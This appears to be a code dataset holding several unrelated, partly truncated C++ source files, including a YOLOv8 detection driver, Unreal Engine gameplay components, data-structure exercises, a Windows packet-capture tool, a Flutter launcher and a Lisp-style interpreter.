Create an instance of the YOLOv8 object detector\n    YOLOv8* yolov8 = new YOLOv8(engine_file_path);\n    yolov8->make_pipe(true);\n\n    // Process based on input type\n    if (input_type == \"video\") {\n        assert(argc == 6);\n        input_value = argv[3];\n        if (IsFile(input_value)) {\n            string suffix = input_value.substr(input_value.find_last_of('.') + 1);\n            // Check if the input video file has a supported format\n            if (suffix == \"mp4\" || suffix == \"avi\" || suffix == \"m4v\" || suffix == \"mpeg\" || suffix == \"mov\" || suffix == \"mkv\") {\n                isVideo = true;\n            } else {\n                printf(\"suffix %s is wrong !!!\\n\", suffix.c_str());\n                abort();\n            }\n        }\n        infer_rate = stoi(argv[4]);\n        output_type = argv[5];\n        ssh = (argc >= 7) ? argv[6] : \"\";\n\n    } else if (input_type == \"camera\") {\n        assert(argc == 5);\n        infer_rate = stoi(argv[3]);\n        output_type = argv[4];\n        ssh = (argc >= 6) ? argv[5] : \"\";\n        isCamera = true;\n\n    }\n\n    // Initialize OpenCV video capture and video writer\n    VideoCapture cap;\n    VideoWriter writer;\n    if (isVideo) {\n        cap.open(input_value);\n        if (!cap.isOpened()) {\n            printf(\"can not open %s\\n\", input_value.c_str());\n            return -1;\n        }\n\n        // Get video frame size\n        Size size = Size((int)cap.get(CAP_PROP_FRAME_WIDTH), (int)cap.get(CAP_PROP_FRAME_HEIGHT));\n\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = time(nullptr);\n            auto tm = *localtime(&t);\n            ostringstream oss;\n            oss << put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            size_t lastSlash = input_value.find_last_of('/');\n            size_t lastDot = input_value.find_last_of('.');\n            string rawname = input_value.substr(lastSlash + 1, lastDot - lastSlash - 1);\n            new_filename = rawname + \"_detection_\" + str + \".avi\";\n            writer.open(new_filename, VideoWriter::fourcc('X', 'V', 'I', 'D'), 30, size);\n        }\n    } else {\n        // Settings for camera input\n        int capture_width = 1280;\n        int capture_height = 720;\n        int display_width = 1280;\n        int display_height = 720;\n        int framerate = 30;\n        int flip_method = 2;\n\n\n        // Generate the GStreamer pipeline string\n\n        pipeline = gstreamer_pipeline(capture_width, capture_height, display_width, display_height, framerate, flip_method);         \n\n        cout << \"Using pipeline: \\n\\t\" << pipeline << \"\\n\";\n\n        // Open the camera using the GStreamer pipeline\n        cap.open(pipeline, CAP_GSTREAMER);\n        if (!cap.isOpened()) {\n            cout << \"Failed to open camera.\" << endl;\n            return -1;\n        }\n\n        // Get camera frame size\n        Size size = Size((int)cap.get(CAP_PROP_FRAME_WIDTH), (int)cap.get(CAP_PROP_FRAME_HEIGHT));\n        if (output_type == \"save\") {\n            // Generate a new filename for the output video\n            auto t = time(nullptr);\n            auto tm = *localtime(&t);\n            ostringstream oss;\n            oss << put_time(&tm, \"%Y-%m-%d_%H-%M-%S\");\n            auto str = oss.str();\n            size_t lastindex = input_value.find_last_of(\".\");\n            string rawname = input_value.substr(0, lastindex);\n            new_filename = \"Camera_detection_\" + str + \".avi\";\n            writer.open(new_filename, VideoWriter::fourcc('X', 'V', 'I', 'D'), 30, size);\n        }\n    }\n\n    // Get the frame rate of the video\n    int fps = cap.get(CAP_PROP_FPS);\n\n    // Variables for image processing\n    Mat res, image;\n    Size size = Size{640, 640};\n    vector<Object> objs;\n    vector<Object> track_objs;\n\n    // Create a tracker object for object tracking\n    BYTETracker tracker(fps, 30);\n\n    if (ss",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n\n#include \"TP_WeaponComponent.h\"\n#include \"GameDevCharacter.h\"\n#include \"GameDevProjectile.h\"\n#include \"GameFramework/PlayerController.h\"\n#include \"Camera/PlayerCameraManager.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"Animation/AnimInstance.h\"\n#include \"Engine/LocalPlayer.h\"\n#include \"Engine/World.h\"\n\n// Sets default values for this component's properties\nUTP_WeaponComponent::UTP_WeaponComponent()\n{\n\t// Default offset from the character location for projectiles to spawn\n\tMuzzleOffset = FVector(100.0f, 0.0f, 10.0f);\n}\n\n\nvoid UTP_WeaponComponent::Fire()\n{\n\tif (Character == nullptr || Character->GetController() == nullptr)\n\t{\n\t\treturn;\n\t}\n\n\t// Try and fire a projectile\n\tif (ProjectileClass != nullptr)\n\t{\n\t\tUWorld* const World = GetWorld();\n\t\tif (World != nullptr)\n\t\t{\n\t\t\tAPlayerController* PlayerController = Cast<APlayerController>(Character->GetController());\n\t\t\tconst FRotator SpawnRotation = PlayerController->PlayerCameraManager->GetCameraRotation();\n\t\t\t// MuzzleOffset is in camera space, so transform it to world space before offsetting from the character location to find the final muzzle position\n\t\t\tconst FVector SpawnLocation = GetOwner()->GetActorLocation() + SpawnRotation.RotateVector(MuzzleOffset);\n\t\n\t\t\t//Set Spawn Collision Handling Override\n\t\t\tFActorSpawnParameters ActorSpawnParams;\n\t\t\tActorSpawnParams.SpawnCollisionHandlingOverride = ESpawnActorCollisionHandlingMethod::AdjustIfPossibleButDontSpawnIfColliding;\n\t\n\t\t\t// Spawn the projectile at the muzzle\n\t\t\tWorld->SpawnActor<AGameDevProjectile>(ProjectileClass, SpawnLocation, SpawnRotation, ActorSpawnParams);\n\t\t}\n\t}\n\t\n\t// Try and play the sound if specified\n\tif (FireSound != nullptr)\n\t{\n\t\tUGameplayStatics::PlaySoundAtLocation(this, FireSound, Character->GetActorLocation());\n\t}\n\t\n\t// Try and play a firing animation if specified\n\tif (FireAnimation != nullptr)\n\t{\n\t\t// Get the animation object for the arms mesh\n\t\tUAnimInstance* AnimInstance = Character->GetMesh1P()->GetAnimInstance();\n\t\tif (AnimInstance != nullptr)\n\t\t{\n\t\t\tAnimInstance->Montage_Play(FireAnimation, 1.f);\n\t\t}\n\t}\n}\n\nbool UTP_WeaponComponent::AttachWeapon(AGameDevCharacter* TargetCharacter)\n{\n\tCharacter = TargetCharacter;\n\n\t// Check that the character is valid, and has no weapon component yet\n\tif (Character == nullptr || Character->GetInstanceComponents().FindItemByClass<UTP_WeaponComponent>())\n\t{\n\t\treturn false;\n\t}\n\n\t// Attach the weapon to the First Person Character\n\tFAttachmentTransformRules AttachmentRules(EAttachmentRule::SnapToTarget, true);\n\tAttachToComponent(Character->GetMesh1P(), AttachmentRules, FName(TEXT(\"GripPoint\")));\n\n\t// add the weapon as an instance component to the character\n\tCharacter->AddInstanceComponent(this);\n\n\t// Set up action bindings\n\tif (APlayerController* PlayerController = Cast<APlayerController>(Character->GetController()))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\t// Set the priority of the mapping to 1, so that it overrides the Jump action with the Fire action when using touch input\n\t\t\tSubsystem->AddMappingContext(FireMappingContext, 1);\n\t\t}\n\n\t\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerController->InputComponent))\n\t\t{\n\t\t\t// Fire\n\t\t\tEnhancedInputComponent->BindAction(FireAction, ETriggerEvent::Triggered, this, &UTP_WeaponComponent::Fire);\n\t\t}\n\t}\n\n\treturn true;\n}\n\nvoid UTP_WeaponComponent::EndPlay(const EEndPlayReason::Type EndPlayReason)\n{\n\tif (Character == nullptr)\n\t{\n\t\treturn;\n\t}\n\n\tif (APlayerController* PlayerController = Cast<APlayerController>(Character->GetController()))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\tSubsystem->RemoveMappingContext(FireMappingContext);\n\t\t}\n\t}\n}",
    "#include <iostream>\n#include <string>\n#include <sstream>\n#include <functional>\n#include \"BinaryTree.h\"\n\nusing namespace std;\n\n/**\n * helper for printout\n*/\nstatic void printOutput(vector<vector<int>>& allLayers) {\n    cout<<\"Depth: \"<< allLayers.size() << endl;\n    cout<<\"[\";\n    for (auto layer : allLayers) {\n        cout<<\"[\";\n        for (int idex = 0; idex < layer.size(); idex++) {\n            cout<< layer.at(idex);\n            if (idex != (layer.size() -1)) cout << \",\";\n        }\n        cout<<\"]\";\n    }\n    cout<<\"]\\n\";\n}\n\n/**\n * compare vector\n*/\nstatic bool compareVector(vector<vector<int>>& vector1, vector<vector<int>>& vector2) {\n    if (vector1.size() != vector2.size()) return false;\n    for (int layer = 0; layer < vector1.size(); layer++) {\n        for (int nodeIdx = 0; nodeIdx < vector1.at(layer).size(); nodeIdx++) {\n            if (vector1.at(layer).at(nodeIdx) != vector2.at(layer).at(nodeIdx)) return false;\n        }\n    }\n    return true;\n}\n\nstatic void test() {\n  /**\n   * test case 1\n  */\n  {\n      cout<<\"===============TEST 1 START=================\"<<endl;\n      cout<<\"Tree:root = [-10,9,20,null,null,15,7]\\n\";\n      int expected = 42;\n      cout<<\"Expected: \"<< expected << endl;\n      TreeNode *root = new TreeNode(-10);\n      TreeNode *l10 = new TreeNode(9);\n      TreeNode *l11 = new TreeNode(20);\n      TreeNode *l22 = new TreeNode(15);\n      TreeNode *l23 = new TreeNode(7);\n      root->left = l10;\n      root->right = l11;\n      l11->left = l22;\n      l11->right = l23;\n\n\n      // confirm solution\n      Solution solution;\n      auto result = solution.maxPathSum(root);\n      cout<< \"Result:\" << result << endl;\n      cout<< ((result == expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n      delete l11;\n      delete l22;\n      delete l23;\n  }\n  /**\n   * test case 2\n  */\n  {\n      cout<<\"===============TEST 1 START=================\"<<endl;\n      cout<<\"Tree:root = [1]\\n\";\n      int expected = 1;\n      cout<<\"Expected: \"<< expected << endl;\n      TreeNode *root = new TreeNode(1);\n\n\n\n      // confirm solution\n      Solution solution;\n      auto result = solution.maxPathSum(root);\n      cout<< \"Result:\" << result << endl;\n      cout<< ((result == expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n  }\n\n    /**\n   * test case 2\n  */\n  {\n      cout<<\"===============TEST 1 START=================\"<<endl;\n      cout<<\"Tree:root = [1,2]\\n\";\n      int expected = 3;\n      cout<<\"Expected: \"<< expected << endl;\n      TreeNode *root = new TreeNode(1);\n      TreeNode *l10 = new TreeNode(2);\n      root->left = l10;\n\n\n      // confirm solution\n      Solution solution;\n      auto result = solution.maxPathSum(root);\n      cout<< \"Result:\" << result << endl;\n      cout<< ((result == expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n  }\n      /**\n   * test case 2\n  */\n  {\n      cout<<\"===============TEST 1 START=================\"<<endl;\n      cout<<\"Tree:root = [1,-2, 3]\\n\";\n      int expected = 4;\n      cout<<\"Expected: \"<< expected << endl;\n      TreeNode *root = new TreeNode(1);\n      TreeNode *l10 = new TreeNode(-2);\n      TreeNode *l11 = new TreeNode(3);\n      root->left = l10;\n      root->right = l11;\n\n\n      // confirm solution\n      Solution solution;\n      auto result = solution.maxPathSum(root);\n      cout<< \"Result:\" << result << endl;\n      cout<< ((result == expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n  }\n}\n/**\n * main function\n*/\nint main(int argc, const char** argv) {\n  test();\n  return 0;\n}\n\n\n",
    "#include <iostream>\r\nusing namespace std;\r\nclass Node{\r\n\t    public:\r\n\t\t    int value;\r\n\t\t    Node *nxtnode;\r\n\t\t\tNode(){\r\n\t\t\t\tvalue=0;\r\n\t\t\t\tnxtnode=NULL;\r\n\t\t\t}//constructor\r\n\t};//Node class\r\n\t\r\nclass SLL{\r\n\tNode *head;\r\n\tNode *current;\r\n\tNode *previous;\r\n\tNode *temp;\r\n\tNode *next;\r\n\tpublic:\r\n\t\tint size;\r\n\t\tSLL(){ head=NULL;\r\n\t\t\tsize=0;\r\n\t\t}//constructor\r\n\t\tvoid reverse(){\r\n\t\t\t    previous=NULL;\r\n\t\t\t  \tcurrent=head;\r\n\t\t\t  \tnext=NULL;\t\t\r\n\t\t\t  \twhile(current!=NULL){\r\n                    next = current->nxtnode;\r\n                    current->nxtnode = previous;\r\n                    previous = current;\r\n                    current = next;\r\n                } \r\n                       head=previous;\r\n\t\t}//reverse\r\n\t\tvoid display_entire_list(){\r\n\t\t\tcurrent=head;\r\n\t\t\t\twhile(current!=NULL){\r\n\t\t\t\t\tcout<<\" \"<<current->value;\r\n\t\t\t\t\tcurrent=current->nxtnode;}\r\n\t\t}//display entire list\r\n\t\tvoid create_empty_list(){\r\n\t\t\tNode * head=NULL;\r\n\t\t\t\r\n\t\t}//create list\r\n\t\t\r\n\t\tvoid insertion(){\r\n\t        char choice;\r\n\t        int v;\r\n    \t    cout<<\"\\t\\t === Insertion Menu ===\\n\";\r\n\t\t    cout<<\"\\t a. At the start of list\\n\";\r\n\t\t    cout<<\"\\t b. At the specific location\\n\";\r\n\t\t    cout<<\"\\t c. At the end of list\\n\";\r\n\t\t    cout<<\"\\t d. Exit\\n\";\r\n\t\t    do{\r\n\t\t      cout<<\"Enter choice (in lower case) : \";\r\n\t\t      cin>>choice;\r\n\t\t      if(choice!='a' && choice!='b' && choice!='c' && choice!='d'){\r\n\t\t      \tcout<<\"Invalid choice!\\n\";\r\n\t\t\t  }//if\r\n\t\t\t  }while(choice!='a' && choice!='b' && choice!='c' && choice!='d');\r\n\t\t\t  if(choice=='d'){\r\n\t\t\t  \texit(1);\r\n\t\t\t  }\r\n\t\t\t  cout<<\"Enter value : \";\r\n\t\t\t  cin>>v;\r\n\t\t\t  switch(choice){\r\n\t\t\t  \tcase'a':{\r\n\t\t\t\t\t\tNode* newnode=new Node;\r\n\t\t\t\t        newnode->value=v;\r\n\t\t\t\t        newnode->nxtnode=NULL;\r\n\t\t\t\t        if(head==NULL){\r\n\t\t\t\t\t       head=newnode;\r\n         \t\t\t    }\r\n\t\t\t\t        else{\r\n\t\t\t\t\t       newnode->nxtnode=head;\r\n\t\t\t\t\t       head=newnode;\r\n\t\t\t\t        }\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t//insert at start\r\n\t\t\t\t        break;\r\n\t\t\t    case'b':{\r\n\t\t\t\t        int pos;\r\n\t\t\t\t        do{\r\n\t\t\t    \t      cout<<\"Enter position: \";\r\n\t\t\t    \t      cin>>pos;\r\n\t\t\t    \t      if (pos < 1 || pos > size + 1) {\r\n                            cout << \"Invalid position\" << endl;\r\n                          }\r\n                          }while(pos < 1 || pos > size + 1);\r\n\t\t\t    \t    \r\n\t\t\t\t          Node* newnode = new Node;\r\n                          newnode->value = v;\r\n                          if(head==NULL){\r\n\t\t\t\t\t        head=newnode;\r\n         \t\t\t      }\r\n                          else if (pos == 1) {\r\n                            newnode->nxtnode = head;\r\n                            head = newnode;\r\n                          }\r\n                          else{\r\n                            previous = head;\r\n                            for (int i = 1; i<pos-1; i++) {\r\n                               previous = previous->nxtnode;\r\n                            }\r\n                            newnode->nxtnode = previous->nxtnode;\r\n                            previous->nxtnode = newnode;\r\n                            }\r\n                        }\r\n                        //insert at specific location\r\n\t\t\t    \t    break;\r\n\t\t\t  \tcase'c':\r\n\t\t\t  \t\t{ Node* newnode=new Node;\r\n\t\t\t\t      newnode->value=v;\r\n\t\t\t\t      newnode->nxtnode=NULL;\r\n\t\t\t\t\t  if(head == NULL){\r\n\t\t\t\t\t   head=newnode;\r\n\t\t\t\t      }\r\n\t\t\t\t      else{\r\n\t\t\t\t        current =head;\r\n\t\t\t\t        while(current->nxtnode!=NULL){\r\n\t\t\t\t\t      current=current->nxtnode;\r\n\t\t\t\t        }\r\n\t\t\t\t        current->nxtnode=newnode;\r\n\t\t\t\t      }\r\n\t\t\t  \t\t}\r\n\t\t\t\t\t//insert at end\r\n\t\t\t  }//switch\r\n\t\t\t  size++;\r\n\t\t}//insertion\r\n\t\t\r\n\t\tvoid deletion(){\r\n\t\t\tchar choice;\r\n    \t    cout<<\"\\t\\t === Deletion Menu ===\\n\";\r\n\t\t    cout<<\"\\t a. At the start of list\\n\";\r\n\t\t    cout<<\"\\t b. At the specific location\\n\";\r\n\t\t    cout<<\"\\t c. At the end of list\\n\";\r\n\t\t    cout<<\"\\t d. Delete by value\\n\";\r\n\t\t    cout<<\"\\t e. Exit\\n\";\r\n\t\t    do{\r\n\t\t      cout<<\"Enter choice (in lower case) : \";\r\n\t\t      cin>>choice;\r\n\t\t      if(choice!='a' && choice!='b' && choice!='c' && choice!='d' && choice!='e'){\r\n\t\t      \tcout<<\"Invalid choice!\\n\";\r\n\t\t\t  }//if\r\n\t\t\t}while(choice!='a' && choice!='b' && choice!='c' && choice!='d'&& choice!='e');\r\n\t\t\tif(choice=='e'){\r\n\t\t\t  \texit(1);\r\n\t\t\t}\r\n\t\t\tif(head==NULL){\r\n\t\t\t  \tcout<<\"\\n No nodes are exist.\\n\";\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t    switch(choice){\r\n\t\t\t  \t    case'a':\r\n\t\t\t\t\t\ttemp=head;\r\n\t\t\t\t\t\thead=head->nxtnode;\r\n\t\t\t\t\t\tdelete temp;\r\n\t\t\t\t\t\tcout<<\"\\nNode deleted.\\n\";\r\n\t\t\t\t\t\tsize--;\r\n\t\t\t\t\t    //delete at start\r\n\t\t\t\t\t    break;\r\n\t\t\t  \t    case'b':\r\n\t\t\t  \t\t    int pos;\r\n\t\t\t\t        do{\r\n\t\t\t    \t        cout<<\"Enter position: \";\r\n\t\t\t    \t        cin>>pos;\r\n\t\t\t    \t        if (pos < 1 || pos > size + 1) {\r\n                               cout << \"Invalid position\" << endl;\r\n                            }\r\n                        }while(pos < 1 || pos > size + 1);\r\n                        if(pos==1){\r\n                        \ttemp=head;\r\n\t\t\t\t\t\t    head=head->nxtnode;\r\n\t\t\t\t\t\t    delete temp;\r\n\t\t\t\t\t\t    co",
    "// Fill out your copyright notice in the Description page of Project Settings.\n#include \"MovingPlatform.h\"\n\n\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\n\n// Sets default values\nAMovingPlatform::AMovingPlatform()\n{\n\tPrimaryActorTick.bCanEverTick = true;\n}\n\n// Called when the game starts or when spawned\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\t\n\n\t//get actor location\n\tStartActorLocation = GetActorLocation();\n\t//settting the offsets\n\tMoveOffsetNorm = MoveOffset;\n\tMoveOffsetNorm.Normalize();\n\n\t//setting tick function to Moveenable\n\tSetActorTickEnabled(MoveEnable);\n\n\n\t//get a name of all the actors\n\tFString Name = GetName();\n\n\tUE_LOG(LogTemplateCharacter, Display, TEXT(\"Begin Play: %s\"),*Name);\n}\n\n// Called every frame\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\t//using seprate function\n\tMovePlatform(DeltaTime);\n\n\tRotatePlatform(DeltaTime);\n\t\n\t//setting new actor location\n\tSetActorLocation(StartActorLocation + MoveOffsetNorm * CurDistance);\n\t\n\n}\n\nvoid AMovingPlatform::MovePlatform(float Delta)\n{\n\t//if move enable call this\n\tif (MoveEnable)\n\t{\n\t\t//changing currnt direction\n\t\tCurDistance += Delta * Speed * movedirection;\n\n\t\t//cheacking if its reach max distance change the direction\n\t\tif (CurDistance >= maxDistance || CurDistance <= 0.0f)\n\t\t{\n\t\t\tmovedirection *= -1;\n\t\t}\n\t}\n}\n\nvoid AMovingPlatform::RotatePlatform(float Delta)\n{\n\tFRotator CurrentRotation = GetActorRotation();\n\tCurrentRotation = CurrentRotation + RotationVelocity * Delta;\n\tSetActorRotation(CurrentRotation);\n\n\tAddActorLocalRotation(RotationVelocity * Delta);\n}\n\n\n",
    "\ufeff#include \"sniffer.h\"\n#include <iostream>\n#include <iomanip>\n#include <chrono>\n#include <ctime>\n#include <sstream>\n\nvoid writePacketToFile(std::ofstream& outputFile, const std::vector<char>& packet, const char* src_ip, const char* dest_ip, const IPV4_HDR* ip_hdr) {\n    auto now = std::chrono::system_clock::now();\n    std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n    struct tm local_time;\n    localtime_s(&local_time, &now_c);\n\n    // Write data to file\n    outputFile << std::put_time(&local_time, \"%T\") << \" \";\n    outputFile << src_ip << \" \";\n    outputFile << dest_ip << \" \";\n    outputFile << (int)ip_hdr->ip_ttl << \" \";\n    outputFile << (int)ip_hdr->ip_protocol << \" \";\n    outputFile << ip_hdr->ip_total_length << \" \";\n    outputFile.write(packet.data(), packet.size());\n    outputFile << std::endl;\n}\n\nbool receivePacket(SOCKET sock, char* buffer, int bufferSize, char* src_ip, char* dest_ip, IPV4_HDR*& ip_hdr, int& packetSize) {\n    memset(buffer, 0, bufferSize);\n    packetSize = recv(sock, buffer, bufferSize, 0);\n    if (packetSize == SOCKET_ERROR) {\n        std::cerr << \"Recv failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n\n    // Parse the packet\n    ip_hdr = (IPV4_HDR*)buffer;\n    if (inet_ntop(AF_INET, &(ip_hdr->ip_srcaddr), src_ip, INET_ADDRSTRLEN) == NULL ||\n        inet_ntop(AF_INET, &(ip_hdr->ip_destaddr), dest_ip, INET_ADDRSTRLEN) == NULL) {\n        std::cerr << \"inet_ntop failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n    if (strcmp(dest_ip, \"127.0.0.1\") == 0) {\n        // Skip packet if destination address is 127.0.0.1\n        return false;\n    }\n    return true;\n}\n\nstd::string generateFileName() {\n    auto now = std::chrono::system_clock::now();\n    std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n    struct tm local_time;\n    localtime_s(&local_time, &now_c);\n\n    std::ostringstream oss;\n    oss << \"sniff_\";\n    oss << std::put_time(&local_time, \"%Y%m%d_%H%M%S\");\n    oss << \".txt\";\n    return oss.str();\n}\n\nbool initializeWinsock(WSADATA& wsaData) {\n    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (result != 0) {\n        std::cerr << \"WSAStartup failed: \" << result << std::endl;\n        return false;\n    }\n    return true;\n}\n\nSOCKET createRawSocket() {\n    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);\n    if (sock == INVALID_SOCKET) {\n        std::cerr << \"Failed to create socket: \" << WSAGetLastError() << std::endl;\n    }\n    return sock;\n}\n\nbool bindSocket(SOCKET sock) {\n    SOCKADDR_IN addr;\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces\n    addr.sin_port = 0;\n\n    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {\n        std::cerr << \"Bind failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n    return true;\n}\n\n\nvoid packetWriter(std::ofstream& outputFile, std::queue<std::pair<std::vector<char>, std::string>>& packetQueue, std::mutex& queueMutex, std::condition_variable& cv, bool& done) {\n    while (!done || !packetQueue.empty()) {\n        std::unique_lock<std::mutex> lock(queueMutex);\n        cv.wait(lock, [&]() { return !packetQueue.empty() || done; });\n        while (!packetQueue.empty()) {\n            auto packetData = packetQueue.front();\n            packetQueue.pop();\n            lock.unlock();\n            auto packet = packetData.first;\n            auto info = packetData.second;\n            outputFile << info << \" \";\n            for (const auto& byte : packet) {\n                outputFile << std::hex << std::setw(2) << std::setfill('0') << (static_cast<unsigned int>(static_cast<unsigned char>(byte))) << \"\";\n            }\n            outputFile << std::endl;\n            lock.lock();\n        }\n    }\n}\n\nvoid packetReader(const std::string& filename, std::mutex& queueMutex, std::condition_variable& cv, bool& done) {\n    char ch;\n    std::string filter = \"\";\n    int filter_column = 0;\n    int start_index = 0;\n    const int max_display = 30;\n    while (true) {\n        std::vector<Packet> packets = read_packets_from_file(filename);\n\n        if (packets.size() > 30) {\n            packets.resize(30);\n        }\n\n        std::cout << \"\\nEnter column number to filter (1-4), 'r' to reset, 'u' to scroll up, 'd' to scroll down, or 'q' to quit: \";\n        std::cin >> ch;\n        if (ch == 'q' || ch == 'Q') {\n            break;\n        }\n        else if (ch == 'r' || ch == 'R') {\n            filter = \"\";\n            filter_column = 0;\n            start_index = 0;\n            display_packets(packets, filter, filter_column, start_index, max_display);\n            continue;\n        }\n        else if (ch == 'u' || ch == 'U') {\n            if (start_index > 0) {\n                start_index -= max_display;\n                if (start_index < 0) start_index = 0;\n                display_packets(packets, filter, filter_column, start_index, max_display);\n            }\n            el",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_guys_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Env.hpp\"\n#include <iostream>\n\nstatic MalType *eval_ast(MalType *ast, Env &env);\nstatic MalType *_def(MalList *list, Env &env);\nstatic MalType *_let(MalList *list, Env &env);\nstatic MalType *_do(MalList *list, Env &env);\nstatic MalType *_if(MalList *list, Env &env);\nstatic MalType *_fn(MalList *list, Env &env);\n\nstatic MalType *_def(MalList *list, Env &env)\n{\n\tif (list->list[1]->type != MalType::SYMBOL)\n\t\tthrow std::invalid_argument(\n\t\t    \"can't def! without a symbol as first argument\");\n\tconst auto first = static_cast<MalSymbol *>(list->list[1].get());\n\tconst auto second = EVAL(list->list[2].get(), env);\n\tenv.set(first->value, second);\n\treturn eval_ast(second, env);\n}\n\nstatic MalType *_let(MalList *list, Env &env)\n{\n\tif (list->list[1]->type != MalType::LIST)\n\t\tthrow std::invalid_argument(\n\t\t    \"can't let* without a list as first argument\");\n\t// NOTE might need to put actual vectors\n\tEnv new_env = Env(&env, StringVec{}, NULL);\n\tconst auto args = static_cast<MalList *>(list->list[1].get());\n\tconst auto size = args->list.size();\n\tfor (std::size_t i = 0; i < size - (size % 2); i += 2) {\n\t\tconst auto key = static_cast<MalSymbol *>(args->list[i].get());\n\t\tnew_env.set(key->value, EVAL(args->list[i + 1].get(), new_env));\n\t}\n\treturn EVAL(list->list[2].get(), new_env);\n}\n\nstatic MalType *_do(MalList *list, Env &env)\n{\n\tauto ret = std::unique_ptr<MalType>();\n\tfor (auto &e : list->list) {\n\t\tret = std::unique_ptr<MalType>(eval_ast(e.get(), env));\n\t}\n\treturn ret.get()->dup();\n}\n\nstatic MalType *_if(MalList *list, Env &env)\n{\n\tif (list->list.size() < 3 || list->list.size() > 4)\n\t\tthrow std::invalid_argument(\n\t\t    \"can't if on args nb different than 3 or 4\");\n\tconst auto el =\n\t    std::unique_ptr<MalType>(EVAL(list->list[1].get(), env));\n\tconst auto _true = [](MalType *_el) {\n\t\treturn (_el->type != MalType::NIL &&\n\t\t        _el->type != MalType::FALSE);\n\t};\n\tif (_true(el.get()))\n\t\treturn EVAL(list->list[2].get(), env);\n\telse if (list->list.size() == 4)\n\t\treturn EVAL(list->list[3].get(), env);\n\treturn new MalNil;\n}\n\nstatic MalType *_fn(MalList *list, Env &env)\n{\n\t// TODO\n\t(void)list;\n\t(void)env;\n\treturn NULL;\n}\n\nMalType *EVAL(MalType *ast, Env &env)\n{\n\tif (ast->type == MalType::LIST) {\n\t\tauto list = static_cast<MalList *>(ast);\n\t\tif (list->empty())\n\t\t\treturn new MalNil;\n\t\tif (list->list[0]->type == MalType::SYMBOL) {\n\t\t\tMalSymbol *symbol =\n\t\t\t    static_cast<MalSymbol *>(list->list[0].get());\n\t\t\tif (symbol->value == \"def!\")\n\t\t\t\treturn _def(list, env);\n\t\t\tif (symbol->value == \"let*\")\n\t\t\t\treturn _let(list, env);\n\t\t\tif (symbol->value == \"do\")\n\t\t\t\treturn _do(list, env);\n\t\t\tif (symbol->value == \"if\")\n\t\t\t\treturn _if(list, env);\n\t\t\tif (symbol->value == \"fn*\")\n\t\t\t\treturn _fn(list, env);\n\t\t}\n\t\tauto copy = std::unique_ptr<MalList>(\n\t\t    static_cast<MalList *>(eval_ast(list, env)));\n\t\tif (copy->list[0]->type == MalType::FUNC) {\n\t\t\treturn static_cast<MalFunc *>(copy->list[0].get())\n\t\t\t    ->apply(copy.get());\n\t\t} else {\n\t\t\tthrow std::invalid_argument(\n\t\t\t    \"not a function as first element\");\n\t\t}\n\t}\n\treturn (eval_ast(ast, env));\n}\n\nstatic MalType *eval_ast(MalType *ast, Env &env)\n{\n\tswitch (ast->type) {\n\tcase MalType::SYMBOL: {\n\t\tauto symbol = static_cast<MalSymbol *>(ast)->value;\n\t\treturn env.get(symbol)->dup();\n\t}\n\tcase MalType::LIST: {\n\t\tMalList *list = static_cast<MalList *>(ast);\n\t\tauto copy = new MalList{};\n\t\tfor (auto &e : list->list)\n\t\t\tcopy->add(EVAL(e.get(), 